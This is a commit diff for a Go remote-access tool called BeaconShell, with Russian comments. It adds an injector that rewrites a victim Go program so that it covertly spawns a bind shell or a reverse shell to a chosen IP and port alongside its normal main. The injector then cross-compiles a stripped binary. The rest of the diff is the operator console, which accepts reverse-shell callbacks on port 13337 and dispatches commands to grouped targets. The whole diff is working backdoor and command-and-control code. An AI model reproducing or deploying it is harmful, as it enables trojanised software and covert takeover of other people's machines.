25dc5cd0b6fc6891aec18817ea9063eeb951a0da
Saimikiry <saimikirycoding@gmail.com>
2024-08-18 14:56:56 +0300

    Race condition bug fix

---
+++ Source/inject.go
@@ -0,0 +1,146 @@
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"os"
+	"os/exec"
+	"strings"
+)
+
+func BeaconShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
+	// Открытие оригинального файла
+	original_file, err := os.OpenFile(file_path, os.O_RDWR|os.O_APPEND, 0644)
+	if err != nil {
+		BSPrint("Can't open file %s with error: %s\n", file_path, err.Error())
+		return
+	}
+	defer original_file.Close()
+
+	lines := []string{}
+	imports := []string{}
+	new_imports := []string{}
+	var isImportSection bool
+
+	// Создание сканера для построчного чтения файла
+	scanner := bufio.NewScanner(original_file)
+
+	for scanner.Scan() {
+		line := scanner.Text()
+
+		// Изменение имени исходной функции main
+		if strings.HasPrefix(line, "func main") {
+			line = strings.Replace(line, "func main", "func main_payload", 1)
+			fmt.Println("main found and replaced.")
+		}
+
+		// Проверяем, начинаем ли мы секцию импорта
+		if strings.HasPrefix(line, "import (") {
+			isImportSection = true
+		}
+
+		// Если мы находимся в секции импорта, собираем импорты
+		if isImportSection {
+			if strings.TrimSpace(line) == ")" {
+				isImportSection = false
+			} else {
+				imports = append(imports, strings.TrimSpace(line))
+			}
+		}
+
+		lines = append(lines, line)
+	}
+
+	/*
+		if err := scanner.Err(); err != nil {
+			fmt.Println("Scanning error!")
+			return
+		}
+	*/
+	fmt.Println(len(lines))
+
+	// Проверка и добавление необходимых импортов
+	requiredImports := []string{"\"io\"", "\"net\"", "\"os/exec\""}
+	for _, reqImport := range requiredImports {
+		if !isImportContains(imports, reqImport) {
+			new_imports = append(new_imports, reqImport)
+			fmt.Printf("Импорт %s добавлен.\n", reqImport)
+		}
+	}
+
+	// Обновляем секцию импорта в строках
+	if len(new_imports) > 0 {
+		lines = updateImports(lines, new_imports)
+	}
+
+	err = os.WriteFile("result.go", []byte(strings.Join(lines, "\n")), 0644)
+
+	new_file, err := os.OpenFile("result.go", os.O_RDWR|os.O_APPEND, 0644)
+	if err != nil {
+		BSPrint("Can't open file %s with error: %s\n", new_file.Name(), err.Error())
+		return
+	}
+	defer new_file.Close()
+
+	// Инициализация строки с инъекцией
+	BS_string := ""
+
+	// Заполнение строки с инъекцией
+	switch shell_type {
+	case "bind":
+		BS_string = fmt.Sprintf("\n\nfunc bs_handle(BS_conn net.Conn) {\n\tBS_conn.Write([]byte(\"%s\"))\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_listener, _ := net.Listen(\"tcp\", \":%d\")\n\tfor {\n\t\tBS_conn, _ := BS_listener.Accept()\n\t\tgo bs_handle(BS_conn)\n\t}\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}", OS, port)
+	case "reverse":
+		BS_string = fmt.Sprintf("\n\nfunc bs_handle(BS_conn net.Conn) {\n\tBS_conn.Write([]byte(\"%s\"))\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_conn, _ := net.Dial(\"tcp\", \"%s:%d\")\n\tbs_handle(BS_conn)\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}", OS, ip, port)
+	default:
+		BSPrint("Incorrect shell type!\n")
+		return
+	}
+
+	// Добавление инъекции в файл
+	if _, err := new_file.WriteString(BS_string); err != nil {
+		BSPrint("Can't modify file!\n")
+		return
+	}
+
+	// Компиляция файла
+	// Сохранение прежних значений переменных среды
+	old_GOOS := os.Getenv("GOOS")
+	old_GOARCH := os.Getenv("GOARCH")
+
+	// Замена переменной окружения GOOS на целевую ОС
+	err = os.Setenv("GOOS", OS)
+	if err != nil {
+		BSPrint("Can't change GOOS!\n", err)
+		return
+	}
+
+	// Замена переменной окружения ARCHOS на целевую архитектуру
+	err = os.Setenv("GOARCH", Arch)
+	if err != nil {
+		BSPrint("Can't change GOARCH!\n", err)
+		return
+	}
+
+	// Компиляция файла
+	cmd := exec.Command("go", "build", "-o", shell_type, "-ldflags", "-w -s", "result.go")
+	if err := cmd.Run(); err != nil {
+		BSPrint("Compilation error!\n", err)
+		return
+	}
+
+	// Замена переменной окружения GOOS на исходную ОС
+	err = os.Setenv("GOOS", old_GOOS)
+	if err != nil {
+		BSPrint("Can't change GOOS!\n", err)
+		return
+	}
+
+	// Замена переменной окружения ARCHOS на исходную архитектуру
+	err = os.Setenv("GOARCH", old_GOARCH)
+	if err != nil {
+		BSPrint("Can't change GOARCH!\n", err)
+		return
+	}
+
+	BSPrint("File successfully compiled.\n")
+}
--- Source/main.go
+++ Source/main.go
@@ -6,8 +6,8 @@ import (
 	"log"
 	"net"
 	"os"
-	"os/exec"
 	"strings"
+	"sync"
 )
 
 var global_response_timeout int = 1000
@@ -15,11 +15,13 @@ var global_buffer_size int = 4096
 var active_targets int = 0
 
 // Предоставляет список встроенных команд (вызов: /BS help).
-func BindShellHelp() {
-	fmt.Println("[BindShell] Command list:")
-	fmt.Println("\n\t\tTargets:")
+func BeaconShellHelp() {
+	BSPrint("Command list:")
+	fmt.Println("\n\t\tTargets status:")
 	fmt.Println("\t- /BS targets \t\t\tShow current targets list;")
 	fmt.Println("\t- /BS add <ip:port> \t\tAdd target <ip:port> to set;")
+	fmt.Println("\t- /BS add list <file> \t\tAdd targets from <file> to set;")
+	fmt.Println("\t- /BS group <group> <host_id> \tAdd target <host_id> to <group>;")
 	fmt.Println("\t- /BS remove <host_id> \t\tRemove target from set;")
 	fmt.Println("\t- /BS off \t\t\tStop sending commands to the all hosts;")
 	fmt.Println("\t- /BS off <host_id> \t\tStop sending commands to the host;")
@@ -40,21 +42,23 @@ func BindShellHelp() {
 	fmt.Println("\t- /BS help \t\t\tShow this list;")
 	fmt.Println("\t- /BS scenario <scenario> \tStart scenario from file <scenario>; (TODO)")
 	fmt.Println("\t- /BS stop \t\t\tFinish session.")
+
+	fmt.Println("")
 }
 
 // Завершает работу программы (вызов: /BS stop)
-func BindShellStop(targets *[]Target) {
+func BeaconShellStop(targets *[]Target) {
 	// Завершение всех активных соединений
 	finishAllSessions(targets)
 
 	// Завершение программы
-	fmt.Println("[BindShell] Shutdown...")
+	BSPrint("Shutdown...")
 	os.Exit(0)
 }
 
 // Выводит список целевых хостов (вызов: /BS targets)
-func BindShellTargets(targets *[]Target) {
-	fmt.Println("[BindShell] Current targets:")
+func BeaconShellTargets(targets *[]Target) {
+	BSPrint("Current targets (active: %d, total: %d):\n", active_targets, len(*targets))
 	for i := 0; i < len(*targets); i++ {
 		if (*targets)[i].status == true {
 			fmt.Printf("\t<%d> [+] (%s) %s\n", i, (*targets)[i].group, (*targets)[i].name)
@@ -65,76 +69,67 @@ func BindShellTargets(targets *[]Target) {
 }
 
 // Удаляет выбранный хост из списка целей и завершает с ним сессию (вызов: /BS remove)
-func BindShellRemove(targets *[]Target, idx int) {
+func BeaconShellRemove(targets *[]Target, idx int) {
 	active_targets--
 
 	// Завершение сессии удаляемого хоста
 	finishSession((*targets)[idx])
 
-	fmt.Printf("[BindShell] %s << Host removed from target list.\n", (*targets)[idx].name)
+	BSPrint("%s removed from target list.\n", (*targets)[idx].name)
 
 	// Удаление хоста из списка целей
 	*targets = append((*targets)[:idx], (*targets)[idx+1:]...)
 }
 
 // Приостановление взаимодействия с целью (вызов: /BS off)
-func BindShellOff(targets *[]Target, idx int) {
+func BeaconShellOff(targets *[]Target, idx int) {
 	if (*targets)[idx].status == false {
-		fmt.Println("[BindShell] The host is already an inactive target!")
+		BSPrint("The host is already an inactive target!\n")
 		return
 	}
 
 	active_targets--
 	(*targets)[idx].status = false
-	fmt.Printf("[BindShell] %s off.\n", (*targets)[idx].name)
+	BSPrint("%s off.\n", (*targets)[idx].name)
 }
 
 // Возобновление взаимодействия с целью (вызов: /BS on)
-func BindShellOn(targets *[]Target, idx int) {
+func BeaconShellOn(targets *[]Target, idx int) {
 	if (*targets)[idx].status == true {
-		fmt.Println("[BindShell] The host is already an active target!")
+		BSPrint("The host is already an active target!\n")
 		return
 	}
 
 	active_targets++
 	(*targets)[idx].status = true
-	fmt.Printf("[BindShell] %s on.\n", (*targets)[idx].name)
+	BSPrint("%s on.\n", (*targets)[idx].name)
 }
 
 // Вывод сведений о текущей конфигурации
-func BindShellConfig() {
-	fmt.Println("[BindShell] Current configuration:")
+func BeaconShellConfig() {
+	BSPrint("Current configuration:\n")
 	fmt.Printf("\tResponse timeout: %d millisecond(s).\n", global_response_timeout)
 	fmt.Printf("\tBuffer size: %d byte(s).\n", global_buffer_size)
 }
 
 // Устанавливает значение переменной global_response_timeout равным value (вызов: /BS timeout)
-func BindShellTimeout(value int) {
+func BeaconShellTimeout(value int) {
 	global_response_timeout = value
-	fmt.Printf("[BindShell] Response timeout set to %d millisecond(s).\n", global_response_timeout)
+	BSPrint("Response timeout set: %d millisecond(s).\n", global_response_timeout)
 }
 
 // Устанавливает значение переменной global_buffer_size равным value (вызов: /BS buffer)
-func BindShellBufferSize(value int) {
+func BeaconShellBufferSize(value int) {
 	global_buffer_size = value
-	fmt.Printf("[BindShell] Buffer size set to %d byte(s).\n", global_buffer_size)
+	BSPrint("Buffer size set to %d byte(s).\n", global_buffer_size)
 }
 
 // Устанавливает соединение с выбранным хостом и добавляет его в список целей (вызов: /BS add)
-func BindShellAdd(targets *[]Target, target_name string) {
+func BeaconShellAdd(targets *[]Target, target_name string) {
 	addSession(targets, target_name)
 }
 
-func BindShellLoadTargets(targets *[]Target, targets_file string) {
-	// Обнуление числа текущих целей
-	active_targets = 0
-
-	// Завершение всех активных соединений
-	finishAllSessions(targets)
-
-	// Очистка списка целей
-	*targets = []Target{}
-
+func BeaconShellListAdd(targets *[]Target, targets_file string) {
 	// Открытие файла с новыми целями
 	file, err := os.Open(targets_file)
 	if err != nil {
@@ -149,153 +144,38 @@ func BindShellLoadTargets(targets *[]Target, targets_file string) {
 	for scanner.Scan() {
 		// Получение имени хоста
 		target_name := scanner.Text()
+		isUnique := true
 
-		// Добавление сессии
-		addSession(targets, target_name)
-	}
-}
-
-func BindShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
-	// Открытие оригинального файла
-	original_file, err := os.OpenFile(file_path, os.O_RDWR|os.O_APPEND, 0644)
-	if err != nil {
-		fmt.Printf("[BindShell] Can't open file %s with error: %s\n", file_path, err.Error())
-		return
-	}
-	defer original_file.Close()
-
-	lines := []string{}
-	imports := []string{}
-	new_imports := []string{}
-	var isImportSection bool
-
-	// Создание сканера для построчного чтения файла
-	scanner := bufio.NewScanner(original_file)
-
-	for scanner.Scan() {
-		line := scanner.Text()
-
-		// Изменение имени исходной функции main
-		if strings.HasPrefix(line, "func main") {
-			line = strings.Replace(line, "func main", "func main_payload", 1)
-			fmt.Println("main found and replaced.")
-		}
-
-		// Проверяем, начинаем ли мы секцию импорта
-		if strings.HasPrefix(line, "import (") {
-			isImportSection = true
-		}
-
-		// Если мы находимся в секции импорта, собираем импорты
-		if isImportSection {
-			if strings.TrimSpace(line) == ")" {
-				isImportSection = false
-			} else {
-				imports = append(imports, strings.TrimSpace(line))
+		// Проверка уникальности новой цели
+		for i := 0; i < len(*targets); i++ {
+			// Если цель уже присутствует в списке:
+			if target_name == (*targets)[i].name {
+				// Указать на это
+				isUnique = false
+				break
 			}
 		}
 
-		lines = append(lines, line)
-	}
-
-	/*
-		if err := scanner.Err(); err != nil {
-			fmt.Println("Scanning error!")
-			return
-		}
-	*/
-	fmt.Println(len(lines))
-
-	// Проверка и добавление необходимых импортов
-	requiredImports := []string{"\"io\"", "\"net\"", "\"os/exec\""}
-	for _, reqImport := range requiredImports {
-		if !isImportContains(imports, reqImport) {
-			new_imports = append(new_imports, reqImport)
-			fmt.Printf("Импорт %s добавлен.\n", reqImport)
+		// Если цель уникальна - добавление сессии
+		if isUnique {
+			addSession(targets, target_name)
 		}
 	}
-
-	// Обновляем секцию импорта в строках
-	if len(new_imports) > 0 {
-		lines = updateImports(lines, new_imports)
-	}
-
-	err = os.WriteFile("result.go", []byte(strings.Join(lines, "\n")), 0644)
-
-	new_file, err := os.OpenFile("result.go", os.O_RDWR|os.O_APPEND, 0644)
-	if err != nil {
-		fmt.Printf("[BindShell] Can't open file %s with error: %s\n", new_file.Name(), err.Error())
-		return
-	}
-	defer new_file.Close()
-
-	// Инициализация строки с инъекцией
-	BS_string := ""
-
-	// Заполнение строки с инъекцией
-	switch shell_type {
-	case "bind":
-		BS_string = fmt.Sprintf("\n\nfunc bs_handle(BS_conn net.Conn) {\n\tBS_conn.Write([]byte(\"%s\"))\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_listener, _ := net.Listen(\"tcp\", \":%d\")\n\tfor {\n\t\tBS_conn, _ := BS_listener.Accept()\n\t\tgo bs_handle(BS_conn)\n\t}\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}", OS, port)
-	case "reverse":
-		BS_string = fmt.Sprintf("\n\nfunc bs_handle(BS_conn net.Conn) {\n\tBS_conn.Write([]byte(\"%s\"))\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_conn, _ := net.Dial(\"tcp\", \"%s:%d\")\n\tbs_handle(BS_conn)\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}", OS, ip, port)
-	default:
-		fmt.Println("[BindShell] Incorrect shell type!")
-		return
-	}
-
-	// Добавление инъекции в файл
-	if _, err := new_file.WriteString(BS_string); err != nil {
-		fmt.Printf("[BindShell] Can't modify file %s with error: %s\n", "result.go", err.Error())
-		return
-	}
-
-	// Компиляция файла
-	// Сохранение прежних значений переменных среды
-	old_GOOS := os.Getenv("GOOS")
-	old_GOARCH := os.Getenv("GOARCH")
-
-	// Замена переменной окружения GOOS на целевую ОС
-	err = os.Setenv("GOOS", OS)
-	if err != nil {
-		fmt.Println("[BindShell] Can't change GOOS!", err)
-		return
-	}
-
-	// Замена переменной окружения ARCHOS на целевую архитектуру
-	err = os.Setenv("GOARCH", Arch)
-	if err != nil {
-		fmt.Println("[BindShell] Can't change GOARCH!", err)
-		return
-	}
-
-	// Компиляция файла
-	cmd := exec.Command("go", "build", "-o", "result", "-ldflags", "-w -s", "result.go")
-	if err := cmd.Run(); err != nil {
-		fmt.Println("[BindShell] Compilation error!", err)
-		return
-	}
-
-	// Замена переменной окружения GOOS на исходную ОС
-	err = os.Setenv("GOOS", old_GOOS)
-	if err != nil {
-		fmt.Println("[BindShell] Can't change GOOS!", err)
-		return
-	}
-
-	// Замена переменной окружения ARCHOS на исходную архитектуру
-	err = os.Setenv("GOARCH", old_GOARCH)
-	if err != nil {
-		fmt.Println("[BindShell] Can't change GOARCH!", err)
-		return
-	}
-
-	fmt.Println("[BindShell] File successfully compiled.")
 }
 
-func BindShellRequest(request []string, targets *[]Target) {
+func BeaconShellGroup(targets *[]Target, idx int, group_name string) {
+	(*targets)[idx].group = group_name
+	BSPrint("%s group set: %s.\n", (*targets)[idx].name, group_name)
+}
+
+func BeaconShellScenario(targets *[]Target) {
+
+}
+
+func BeaconShellRequest(request []string, targets *[]Target) {
 	// В случае, если конкретная инструкция не указана, вызывается /BS help
 	if len(request) == 1 {
-		BindShellHelp()
+		BeaconShellHelp()
 		return
 	}
 
@@ -304,32 +184,43 @@ func BindShellRequest(request []string, targets *[]Target) {
 		if len(request) < 3 {
 			return
 		}
-		BindShellAdd(targets, request[2])
+
+		if request[2] == "list" {
+			BeaconShellListAdd(targets, request[3])
+		} else {
+			BeaconShellAdd(targets, request[2])
+		}
 	case "buffer":
 		ok, value := checkPositiveNumber(request[2])
 		if ok {
-			BindShellBufferSize(value)
+			BeaconShellBufferSize(value)
 		}
 	case "config":
-		BindShellConfig()
+		BeaconShellConfig()
 	case "help":
-		BindShellHelp()
+		BeaconShellHelp()
 	case "inject":
 		ok, value := checkPositiveNumber(request[7])
 		if ok {
-			BindShellInject(request[2], request[3], request[4], request[5], request[6], value)
+			BeaconShellInject(request[2], request[3], request[4], request[5], request[6], value)
+		}
+	case "group":
+		ok, idx := checkTargetNumber(targets, request[3])
+
+		if ok {
+			BeaconShellGroup(targets, idx, request[2])
 		}
 	case "off":
 		// Если аргументов более трех, остановка
 		if len(request) > 4 {
-			fmt.Println("[BindShell] Error! Correct usage: \"/BS off\" or \"/BS off <host_id>\"")
+			BSPrint("Error! Correct usage: \"/BS off\", \"/BS off <host_id>\" or \"/BS off group <group>\".\n")
 			return
 		}
 
 		// Если не указан конкретный хост, приостановить всё
 		if len(request) == 2 {
 			for i := 0; i < len(*targets); i++ {
-				BindShellOff(targets, i)
+				BeaconShellOff(targets, i)
 			}
 			return
 		}
@@ -338,7 +229,7 @@ func BindShellRequest(request []string, targets *[]Target) {
 		if len(request) == 4 && request[2] == "group" {
 			for i := 0; i < len(*targets); i++ {
 				if (*targets)[i].group == request[3] {
-					BindShellOff(targets, i)
+					BeaconShellOff(targets, i)
 				}
 			}
 			return
@@ -349,19 +240,19 @@ func BindShellRequest(request []string, targets *[]Target) {
 
 		// Если идентификатор корректен, приостановить действия на выбранном хосте
 		if ok {
-			BindShellOff(targets, idx)
+			BeaconShellOff(targets, idx)
 		}
 	case "on":
 		// Если аргументов более трех, остановка
 		if len(request) > 4 {
-			fmt.Println("[BindShell] Error! Correct usage: \"/BS on\" or \"/BS on <host_id>\"")
+			BSPrint("Error! Correct usage: \"/BS on\", \"/BS on <host_id>\" or \"/BS on group <group>\".\n")
 			return
 		}
 
 		// Если не указан конкретный хост, возобновить всё
 		if len(request) == 2 {
 			for i := 0; i < len(*targets); i++ {
-				BindShellOn(targets, i)
+				BeaconShellOn(targets, i)
 			}
 			return
 		}
@@ -370,7 +261,7 @@ func BindShellRequest(request []string, targets *[]Target) {
 		if len(request) == 4 && request[2] == "group" {
 			for i := 0; i < len(*targets); i++ {
 				if (*targets)[i].group == request[3] {
-					BindShellOn(targets, i)
+					BeaconShellOn(targets, i)
 				}
 			}
 			return
@@ -381,12 +272,12 @@ func BindShellRequest(request []string, targets *[]Target) {
 
 		// Если идентификатор корректен, возобновить действия на выбранном хосте
 		if ok {
-			BindShellOn(targets, idx)
+			BeaconShellOn(targets, idx)
 		}
 	case "remove":
 		// Если аргументов более трех, остановка
 		if len(request) > 3 {
-			fmt.Println("[BindShell] Error! Correct usage: \"/BS remove\" or \"/BS remove <host_id>\"")
+			BSPrint("Error! Correct usage: \"/BS remove\", \"/BS remove <host_id>\" or \"/BS remove group <group>\".\n")
 			return
 		}
 
@@ -394,7 +285,7 @@ func BindShellRequest(request []string, targets *[]Target) {
 		if len(request) == 2 {
 			cnt := len(*targets)
 			for i := 0; i < cnt; i++ {
-				BindShellRemove(targets, 0)
+				BeaconShellRemove(targets, 0)
 			}
 			return
 		}
@@ -405,7 +296,7 @@ func BindShellRequest(request []string, targets *[]Target) {
 				cnt := len(*targets)
 				for i := 0; i < cnt; {
 					if (*targets)[i].group == request[3] {
-						BindShellOff(targets, i)
+						BeaconShellOff(targets, i)
 					} else {
 						i++
 					}
@@ -419,23 +310,23 @@ func BindShellRequest(request []string, targets *[]Target) {
 
 		// Если идентификатор корректен, удаляет выбранный хост
 		if ok {
-			BindShellRemove(targets, idx)
+			BeaconShellRemove(targets, idx)
 		}
 	case "stop":
-		BindShellStop(targets)
+		BeaconShellStop(targets)
 	case "targets":
-		BindShellTargets(targets)
+		BeaconShellTargets(targets)
 	case "timeout":
 		ok, value := checkPositiveNumber(request[2])
 		if ok {
-			BindShellTimeout(value)
+			BeaconShellTimeout(value)
 		}
 	default:
-		fmt.Println("[BindShell] Incorrect shell command!")
+		BSPrint("Incorrect shell command!\n")
 	}
 }
 
-func ReverseShellHandle(targets *[]Target, conn net.Conn) {
+func ReverseShellHandle(targets *[]Target, conn net.Conn, mtx *sync.Mutex) {
 	// Создание буфера для считывания ОС целевого хоста
 	init_buf := make([]byte, global_buffer_size)
 
@@ -446,10 +337,12 @@ func ReverseShellHandle(targets *[]Target, conn net.Conn) {
 	}
 
 	// Добавление хоста в список целей
+	(*mtx).Lock()
 	*targets = append(*targets, Target{name: conn.RemoteAddr().String(), conn: conn, status: false, group: string(init_buf[:n])})
+	(*mtx).Unlock()
 }
 
-func ReverseShellStartServer(targets *[]Target) {
+func ReverseShellStartServer(targets *[]Target, mtx *sync.Mutex) {
 	listener, err := net.Listen("tcp", ":13337")
 	if err != nil {
 		log.Fatalln(err)
@@ -460,28 +353,32 @@ func ReverseShellStartServer(targets *[]Target) {
 		if err != nil {
 			log.Fatalln(err)
 		}
-		go ReverseShellHandle(targets, conn)
+		go ReverseShellHandle(targets, conn, mtx)
 	}
+}
+
+func BSPrint(format string, args ...interface{}) {
+	fmt.Printf("[BShell] "+format, args...)
 }
 
 func main() {
 	// Инициализация контейнера целей
 	targets := make([]Target, 0, 1)
 
-	// Запуск сервера для подключения через Reverse shell
-	go ReverseShellStartServer(&targets)
+	// Создание мьютекса для обеспечения атомарности операций со списком целей
+	mtx := sync.Mutex{}
 
-	// Считывание целей из файла
-	BindShellLoadTargets(&targets, os.Args[1])
+	// Запуск сервера для подключения через Reverse shell
+	go ReverseShellStartServer(&targets, &mtx)
 
 	// Создание объекта NewReader стандартного потока ввода
 	reader := bufio.NewReader(os.Stdin)
 
 	// Инструктаж пользователя
-	fmt.Printf("[BindShell] Print \"/BS help\" to get info.\n")
+	BSPrint("Print \"/BS help\" to get info.\n")
 	for {
 		// Приглашение к вводу команды
-		fmt.Print("[BindShell] >> ")
+		BSPrint(">> ")
 
 		// Считывание команды пользователя
 		input, _ := reader.ReadString('\n')
@@ -499,8 +396,10 @@ func main() {
 
 		// Проверка типа команды
 		if splitted_input[0] == "/BS" {
-			// Выполнение встроенной команды BindShell
-			BindShellRequest(splitted_input, &targets)
+			// Выполнение встроенной команды BeaconShell
+			mtx.Lock()
+			BeaconShellRequest(splitted_input, &targets)
+			mtx.Unlock()
 		} else {
 			// Создание канала для получения результатов команд
 			ch_resp := make(chan string)
